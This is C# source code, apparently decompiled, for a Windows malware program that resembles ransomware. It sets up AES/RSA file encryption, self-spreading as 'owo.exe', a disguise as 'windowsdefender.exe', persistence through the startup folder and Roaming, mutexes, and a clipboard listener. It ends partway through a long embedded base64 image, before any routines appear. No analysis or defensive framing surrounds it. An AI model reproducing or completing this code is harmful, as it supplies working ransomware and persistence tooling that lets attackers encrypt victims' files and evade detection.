using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "owo.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "windowsdefender.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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